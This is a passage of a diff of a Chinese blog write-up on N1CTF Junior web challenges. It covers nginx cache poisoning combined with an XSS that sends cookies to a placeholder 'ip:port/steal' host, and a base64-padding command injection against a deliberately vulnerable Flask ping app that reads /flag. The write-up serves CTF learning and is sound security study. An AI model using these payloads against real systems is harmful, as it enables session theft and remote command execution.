+</span></span><span style=display:flex><span>        flag_value <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>environ<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;FLAG&#39;</span>, <span style=color:#e6db74>&#39;flag</span><span style=color:#e6db74>{fake}</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>with</span> sync_playwright() <span style=color:#66d9ef>as</span> p:
+</span></span><span style=display:flex><span>            browser <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>chromium<span style=color:#f92672>.</span>launch(headless<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, args<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;--no-sandbox&#34;</span>])
+</span></span><span style=display:flex><span>            context <span style=color:#f92672>=</span> browser<span style=color:#f92672>.</span>new_context()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            context<span style=color:#f92672>.</span>add_cookies([{
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;name&#39;</span>: <span style=color:#e6db74>&#39;flag&#39;</span>,
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;value&#39;</span>: flag_value,
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;domain&#39;</span>: <span style=color:#e6db74>&#39;localhost&#39;</span>,
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;path&#39;</span>: <span style=color:#e6db74>&#39;/&#39;</span>,
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;httponly&#39;</span>: <span style=color:#66d9ef>True</span>
+</span></span><span style=display:flex><span>            }])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            page <span style=color:#f92672>=</span> context<span style=color:#f92672>.</span>new_page()
+</span></span><span style=display:flex><span>            page<span style=color:#f92672>.</span>goto(<span style=color:#e6db74>&#34;http://localhost/login&#34;</span>, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>5000</span>)
+</span></span><span style=display:flex><span>            page<span style=color:#f92672>.</span>fill(<span style=color:#e6db74>&#34;input[name=&#39;username&#39;]&#34;</span>, <span style=color:#e6db74>&#34;admin&#34;</span>)
+</span></span><span style=display:flex><span>            page<span style=color:#f92672>.</span>fill(<span style=color:#e6db74>&#34;input[name=&#39;password&#39;]&#34;</span>, admin_password)
+</span></span><span style=display:flex><span>            page<span style=color:#f92672>.</span>click(<span style=color:#e6db74>&#34;input[name=&#39;submit&#39;]&#34;</span>)
+</span></span><span style=display:flex><span>            page<span style=color:#f92672>.</span>wait_for_timeout(<span style=color:#ae81ff>3000</span>)
+</span></span><span style=display:flex><span>            page<span style=color:#f92672>.</span>goto(url, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>5000</span>)
+</span></span><span style=display:flex><span>            page<span style=color:#f92672>.</span>wait_for_timeout(<span style=color:#ae81ff>5000</span>)
+</span></span><span style=display:flex><span>            browser<span style=color:#f92672>.</span>close()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Bot error: </span><span style=color:#e6db74>{</span>str(e)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.0.0.0&#39;</span>, port<span style=color:#f92672>=</span><span style=color:#ae81ff>5000</span>)
+</span></span></code></pre></div><p>实现了一个常规的注册登录修改个人信息的功能，个人信息中可以修改两条内容，一个是ticket，另一个是bio，同时提供了bot访问指定用户bio的功能，第一时间想到XSS带出Cookie，将bio改为XSS语句：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>fetch</span>(<span style=color:#e6db74>&#39;http://ip:port/steal?flag=&#39;</span><span style=color:#f92672>+</span>document.<span style=color:#a6e22e>cookie</span>)<span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/script&gt;</span>
+</span></span></code></pre></div><p>想要实现XSS还需要解决两个问题，第一个问题<code>/api/bio/&lt;string:username></code>路由要求只能自己访问自己的bio，第二个问题bot设置Cookie的<code>httpOnly</code>属性为True，正常情况下是无法通过javascript脚本来获取Cookie的</p><p>nginx.conf：</p><pre tabindex=0><code>user  www-data;
 worker_processes  auto;
 pid        /var/run/nginx.pid;
 
@@ -639,178 +310,84 @@ http {
         }
     }
 }
-</code></pre><p>对于第一个问题，在nginx.conf中甚至直接ban了<code>/api/bio/</code>，但是这里有个nginx的配置问题，正则匹配优先级是高于普通前缀匹配的，因此只要设置用户名为<code>.js/.css</code>后缀，这样就能实现访问自己的bio</p>
-<p>要想让bot访问恶意用户的bio，还需要利用到nginx中设置的cache，本题是10min的缓存，并且没有明确设置缓存键<code>proxy_cache_key</code>，使用默认缓存键，例如：</p>
-<pre tabindex="0"><code>$scheme：GET
+</code></pre><p>对于第一个问题，在nginx.conf中甚至直接ban了<code>/api/bio/</code>，但是这里有个nginx的配置问题，正则匹配优先级是高于普通前缀匹配的，因此只要设置用户名为<code>.js/.css</code>后缀，这样就能实现访问自己的bio</p><p>要想让bot访问恶意用户的bio，还需要利用到nginx中设置的cache，本题是10min的缓存，并且没有明确设置缓存键<code>proxy_cache_key</code>，使用默认缓存键，例如：</p><pre tabindex=0><code>$scheme：GET
 $proxy_host：example.com
 $request_uri：/index.html
-</code></pre><p>通过缓存投毒来绕过<code>current_user.username == username</code>的判断，这样bot就能访问恶意用户的bio，从而解决第一个问题</p>
-<p>对于第二个问题，<code>app.py</code>中设置的是<code>httponly</code>，但是正确的设置应该是<code>httpOnly</code>，因此并没有起到预防XSS窃取Cookie的作用</p>
-<p>大致的攻击流程：<code>创建.js/.css后缀用户名 -&gt; 设置bio为XSS -&gt; 自己访问恶意bio实现缓存投毒 -&gt; bot访问恶意bio实现XSS窃取Cookie</code>，攻击效果：</p>
-<p><img alt="alt" loading="lazy" src="/images/N1CTFJunior202522/1.png"></p>
-<p>参考资料：</p>
-<p><a href="https://www.echo.cool/docs/middleware/nginx/nginx-caching-mechanism/nginx-cache-key/">https://www.echo.cool/docs/middleware/nginx/nginx-caching-mechanism/nginx-cache-key/</a></p>
-<p><a href="https://playwright.net.cn/python/docs/api/class-browsercontext">https://playwright.net.cn/python/docs/api/class-browsercontext</a></p>
-<hr>
-<h2 id="ping">ping<a hidden class="anchor" aria-hidden="true" href="#ping">#</a></h2>
-<p>app.py：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> ipaddress
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> flask
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run_ping</span>(ip_base64):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>        decoded_ip <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(ip_base64)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> re<span style="color:#f92672">.</span><span style="color:#66d9ef">match</span>(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;^\d+\.\d+\.\d+\.\d+$&#39;</span>, decoded_ip):
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> decoded_ip<span style="color:#f92672">.</span>count(<span style="color:#e6db74">&#39;.&#39;</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3</span>:
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> all(<span style="color:#ae81ff">0</span> <span style="color:#f92672">&lt;=</span> int(part) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span> <span style="color:#66d9ef">for</span> part <span style="color:#f92672">in</span> decoded_ip<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)):
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> ipaddress<span style="color:#f92672">.</span>ip_address(decoded_ip):
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(decoded_ip) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">15</span>:
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> re<span style="color:#f92672">.</span><span style="color:#66d9ef">match</span>(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;^[A-Za-z0-9+/=]+$&#39;</span>, ip_base64):
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
-</span></span><span style="display:flex;"><span>    command <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;echo &#34;ping -c 1 $(echo &#39;</span><span style="color:#e6db74">{</span>ip_base64<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; | base64 -d)&#34; | sh&#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>        process <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run(
-</span></span><span style="display:flex;"><span>            command,
-</span></span><span style="display:flex;"><span>            shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
-</span></span><span style="display:flex;"><span>            check<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
-</span></span><span style="display:flex;"><span>            capture_output<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
-</span></span><span style="display:flex;"><span>            text<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>
-</span></span><span style="display:flex;"><span>        )
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process<span style="color:#f92672">.</span>stdout
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>Flask(__name__)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/ping&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ping</span>():
-</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>json
-</span></span><span style="display:flex;"><span>    ip_base64 <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;ip_base64&#39;</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> ip_base64:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#39;error&#39;</span>: <span style="color:#e6db74">&#39;no ip&#39;</span>}), <span style="color:#ae81ff">400</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> run_ping(ip_base64)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> result:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#39;success&#39;</span>: <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">&#39;output&#39;</span>: result}), <span style="color:#ae81ff">200</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#39;success&#39;</span>: <span style="color:#66d9ef">False</span>}), <span style="color:#ae81ff">400</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>)
-</span></span></code></pre></div><p>实现了ping ip的功能，同时对于python base64解码后的ip有严格的过滤，但是在执行命令时用的是linux的base64实现的解码，二者的实现是有差异的，python不会解析填充符<code>=</code>之后的内容：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>s1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;dGVzdA==&#34;</span>
-</span></span><span style="display:flex;"><span>s2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;dGVzdA==Y29tbWFuZA==&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print(base64<span style="color:#f92672">.</span>b64decode(s1)) <span style="color:#75715e"># b&#39;test&#39;</span>
-</span></span><span style="display:flex;"><span>print(base64<span style="color:#f92672">.</span>b64decode(s2)) <span style="color:#75715e"># b&#39;test&#39;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#39;dGVzdA==&#39;</span> | base64 -d
-</span></span><span style="display:flex;"><span>test
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#39;dGVzdA==Y29tbWFuZA==&#39;</span> | base64 -d
-</span></span><span style="display:flex;"><span>testcommand
-</span></span></code></pre></div><p>只需要构造一个base64编码后有填充符的ip，后面跟上base64编码的命令就能实现rce：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ echo -n <span style="color:#e6db74">&#39;8.8.8.8&#39;</span> | base64 | tr -d <span style="color:#e6db74">&#39;\n&#39;</span>; echo -n <span style="color:#e6db74">&#39;;cat /flag&#39;</span> | base64
-</span></span><span style="display:flex;"><span>OC44LjguOA<span style="color:#f92672">==</span>O2NhdCAvZmxhZw<span style="color:#f92672">==</span>
-</span></span></code></pre></div><p>payload：</p>
-<pre tabindex="0"><code>{&#34;ip_base64&#34;:&#34;OC44LjguOA==O2NhdCAvZmxhZw==&#34;}
-</code></pre><p>response：</p>
-<pre tabindex="0"><code>{&#34;output&#34;:&#34;PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=128 time=66.5 ms\n\n--- 8.8.8.8 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 66.546/66.546/66.546/0.000 ms\nflag{test}\n&#34;,&#34;success&#34;:true}
-</code></pre>
-
-  </div>
-
-  <footer class="post-footer">
-    <ul class="post-tags">
-    </ul>
-  </footer>
-</article>
-    </main>
-    
-<footer class="footer">
-        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> · 
-
-    <span>
-        Powered by
-        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
-        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
-    </span>
-</footer>
-<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
-        <path d="M12 6H0l6-6z" />
-    </svg>
-</a>
-
-<script>
-    let menu = document.getElementById('menu')
-    if (menu) {
-        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
-        menu.onscroll = function () {
-            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
-        }
-    }
-
-    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-        anchor.addEventListener("click", function (e) {
-            e.preventDefault();
-            var id = this.getAttribute("href").substr(1);
-            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
-                    behavior: "smooth"
-                });
-            } else {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
-            }
-            if (id === "top") {
-                history.replaceState(null, null, " ");
-            } else {
-                history.pushState(null, null, `#${id}`);
-            }
-        });
-    });
-
-</script>
-<script>
-    var mybutton = document.getElementById("top-link");
-    window.onscroll = function () {
-        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
-            mybutton.style.visibility = "visible";
-            mybutton.style.opacity = "1";
-        } else {
-            mybutton.style.visibility = "hidden";
-            mybutton.style.opacity = "0";
-        }
-    };
-
-</script>
-<script>
-    document.getElementById("theme-toggle").addEventListener("click", () => {
-        if (document.body.className.includes("dark")) {
-            document.body.classList.remove('dark');
-            localStorage.setItem("pref-theme", 'light');
-        } else {
-            document.body.classList.add('dark');
-            localStorage.setItem("pref-theme", 'dark');
-        }
-    })
-
-</script>
-</body>
-
-</html>
+</code></pre><p>通过缓存投毒来绕过<code>current_user.username == username</code>的判断，这样bot就能访问恶意用户的bio，从而解决第一个问题</p><p>对于第二个问题，<code>app.py</code>中设置的是<code>httponly</code>，但是正确的设置应该是<code>httpOnly</code>，因此并没有起到预防XSS窃取Cookie的作用</p><p>大致的攻击流程：<code>创建.js/.css后缀用户名 -> 设置bio为XSS -> 自己访问恶意bio实现缓存投毒 -> bot访问恶意bio实现XSS窃取Cookie</code>，攻击效果：</p><p><img alt=alt loading=lazy src=/images/N1CTFJunior202522/1.png></p><p>参考资料：</p><p><a href=https://www.echo.cool/docs/middleware/nginx/nginx-caching-mechanism/nginx-cache-key/>https://www.echo.cool/docs/middleware/nginx/nginx-caching-mechanism/nginx-cache-key/</a></p><p><a href=https://playwright.net.cn/python/docs/api/class-browsercontext>https://playwright.net.cn/python/docs/api/class-browsercontext</a></p><hr><h2 id=ping>ping<a hidden class=anchor aria-hidden=true href=#ping>#</a></h2><p>app.py：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> base64
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> subprocess
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> ipaddress
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> flask
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>run_ping</span>(ip_base64):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>        decoded_ip <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64decode(ip_base64)<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> re<span style=color:#f92672>.</span><span style=color:#66d9ef>match</span>(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;^\d+\.\d+\.\d+\.\d+$&#39;</span>, decoded_ip):
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> decoded_ip<span style=color:#f92672>.</span>count(<span style=color:#e6db74>&#39;.&#39;</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>3</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> all(<span style=color:#ae81ff>0</span> <span style=color:#f92672>&lt;=</span> int(part) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>256</span> <span style=color:#66d9ef>for</span> part <span style=color:#f92672>in</span> decoded_ip<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;.&#39;</span>)):
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> ipaddress<span style=color:#f92672>.</span>ip_address(decoded_ip):
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> len(decoded_ip) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>15</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> re<span style=color:#f92672>.</span><span style=color:#66d9ef>match</span>(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;^[A-Za-z0-9+/=]+$&#39;</span>, ip_base64):
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>    command <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;&#34;&#34;echo &#34;ping -c 1 $(echo &#39;</span><span style=color:#e6db74>{</span>ip_base64<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39; | base64 -d)&#34; | sh&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>        process <span style=color:#f92672>=</span> subprocess<span style=color:#f92672>.</span>run(
+</span></span><span style=display:flex><span>            command,
+</span></span><span style=display:flex><span>            shell<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>,
+</span></span><span style=display:flex><span>            check<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>,
+</span></span><span style=display:flex><span>            capture_output<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>,
+</span></span><span style=display:flex><span>            text<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>
+</span></span><span style=display:flex><span>        )
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> process<span style=color:#f92672>.</span>stdout
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> flask<span style=color:#f92672>.</span>Flask(__name__)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/ping&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>ping</span>():
+</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> flask<span style=color:#f92672>.</span>request<span style=color:#f92672>.</span>json
+</span></span><span style=display:flex><span>    ip_base64 <span style=color:#f92672>=</span> data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;ip_base64&#39;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> ip_base64:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> flask<span style=color:#f92672>.</span>jsonify({<span style=color:#e6db74>&#39;error&#39;</span>: <span style=color:#e6db74>&#39;no ip&#39;</span>}), <span style=color:#ae81ff>400</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    result <span style=color:#f92672>=</span> run_ping(ip_base64)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> result:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> flask<span style=color:#f92672>.</span>jsonify({<span style=color:#e6db74>&#39;success&#39;</span>: <span style=color:#66d9ef>True</span>, <span style=color:#e6db74>&#39;output&#39;</span>: result}), <span style=color:#ae81ff>200</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> flask<span style=color:#f92672>.</span>jsonify({<span style=color:#e6db74>&#39;success&#39;</span>: <span style=color:#66d9ef>False</span>}), <span style=color:#ae81ff>400</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> flask<span style=color:#f92672>.</span>render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.0.0.0&#39;</span>, port<span style=color:#f92672>=</span><span style=color:#ae81ff>5000</span>)
+</span></span></code></pre></div><p>实现了ping ip的功能，同时对于python base64解码后的ip有严格的过滤，但是在执行命令时用的是linux的base64实现的解码，二者的实现是有差异的，python不会解析填充符<code>=</code>之后的内容：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> base64
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>s1 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;dGVzdA==&#34;</span>
+</span></span><span style=display:flex><span>s2 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;dGVzdA==Y29tbWFuZA==&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(base64<span style=color:#f92672>.</span>b64decode(s1)) <span style=color:#75715e># b&#39;test&#39;</span>
+</span></span><span style=display:flex><span>print(base64<span style=color:#f92672>.</span>b64decode(s2)) <span style=color:#75715e># b&#39;test&#39;</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ echo <span style=color:#e6db74>&#39;dGVzdA==&#39;</span> | base64 -d
+</span></span><span style=display:flex><span>test
